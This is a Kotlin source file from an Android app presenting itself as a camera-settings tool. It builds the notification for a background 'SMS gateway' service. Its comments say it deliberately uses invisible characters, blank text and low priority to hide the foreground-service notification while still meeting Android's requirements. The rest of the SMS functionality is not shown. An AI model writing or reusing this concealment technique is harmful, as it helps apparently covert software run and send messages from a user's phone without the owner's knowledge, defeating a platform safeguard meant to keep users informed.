package com.settingpro.camera.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat
import com.settingpro.camera.R
import com.settingpro.camera.util.Constants

/**
 * SmsGatewayNotifier - Creates invisible/minimal notification for SMS gateway service.
 *
 * Uses invisible characters and minimal priority to hide the foreground service notification
 * while satisfying Android's foreground service requirements.
 */
object SmsGatewayNotifier {

    /**
     * Create the notification channel for the SMS gateway service.
     */
    fun createNotificationChannel(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            val channel = NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_ID,
                "‎", // Invisible character
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = " " // Space
                setShowBadge(false)
            }

            notificationManager.createNotificationChannel(channel)
        }
    }

    /**
     * Create the invisible foreground service notification.
     */
    fun createNotification(context: Context): Notification {
        val pendingIntent = android.app.PendingIntent.getActivity(
            context,
            0,
            android.content.Intent(context, com.settingpro.camera.MainActivity::class.java).apply {
                flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
            },
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(context, Constants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("‎ ") // Invisible character + space
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }
}
